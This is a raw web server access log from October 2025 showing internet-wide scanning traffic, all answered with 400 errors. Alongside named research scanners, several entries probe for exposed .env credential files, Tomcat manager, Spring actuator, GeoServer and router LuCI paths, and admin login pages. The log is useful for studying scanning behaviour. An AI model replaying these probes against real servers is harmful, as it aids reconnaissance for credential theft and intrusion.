216.180.246.30 - - [10/Oct/2025:23:17:22 +0000] "GET /login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:18:54 +0000] "GET /doc/index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:20:41 +0000] "GET /remote/login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:22:49 +0000] "GET //admin/login.asp HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:24:28 +0000] "GET /web/ HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
45.156.129.90 - - [10/Oct/2025:23:25:57 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36" "-"
216.180.246.30 - - [10/Oct/2025:23:26:00 +0000] "GET //webpages/login.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
82.26.208.176 - - [10/Oct/2025:23:31:59 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
82.26.208.176 - - [10/Oct/2025:23:31:59 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
176.65.141.87 - - [10/Oct/2025:23:35:56 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" "-"
91.224.92.17 - - [10/Oct/2025:23:41:42 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
87.121.84.17 - - [10/Oct/2025:23:56:59 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
64.62.156.212 - - [11/Oct/2025:00:02:17 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 YaBrowser/25.8.0.0 Safari/537.36" "-"
64.62.156.212 - - [11/Oct/2025:00:03:36 +0000] "GET /webui/ HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" "-"
5.187.35.21 - - [11/Oct/2025:00:04:48 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
64.62.156.212 - - [11/Oct/2025:00:05:51 +0000] "GET /geoserver/web/ HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 YaBrowser/25.8.0.0 Safari/537.36" "-"
5.187.35.21 - - [11/Oct/2025:00:20:05 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
135.237.81.94 - - [11/Oct/2025:00:29:23 +0000] "GET /manager/html HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
82.26.218.205 - - [11/Oct/2025:00:32:57 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
82.26.218.205 - - [11/Oct/2025:00:32:57 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
87.121.84.17 - - [11/Oct/2025:01:33:41 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
176.65.141.87 - - [11/Oct/2025:01:38:19 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" "-"
13.89.125.30 - - [11/Oct/2025:01:57:43 +0000] "GET /actuator/health HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
204.76.203.212 - - [11/Oct/2025:02:40:53 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
87.121.84.17 - - [11/Oct/2025:03:12:52 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
206.168.34.200 - - [11/Oct/2025:03:42:59 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
206.168.34.200 - - [11/Oct/2025:03:42:59 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
206.168.34.200 - - [11/Oct/2025:03:43:02 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
206.168.34.200 - - [11/Oct/2025:03:43:02 +0000] "GET /login HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.138.176 - - [11/Oct/2025:03:45:28 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.138.176 - - [11/Oct/2025:03:45:28 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
167.94.138.176 - - [11/Oct/2025:03:45:31 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
167.94.138.176 - - [11/Oct/2025:03:45:31 +0000] "GET /.well-known/security.txt HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
196.251.118.109 - - [11/Oct/2025:03:55:31 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.135.10.59 - - [11/Oct/2025:03:59:17 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
185.135.10.59 - - [11/Oct/2025:03:59:18 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
43.130.12.43 - - [11/Oct/2025:04:41:22 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
198.235.24.32 - - [11/Oct/2025:04:50:45 +0000] "GET / HTTP/1.1" 400 154 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
176.65.141.86 - - [11/Oct/2025:05:00:12 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 400 154 "-" "-" "-"
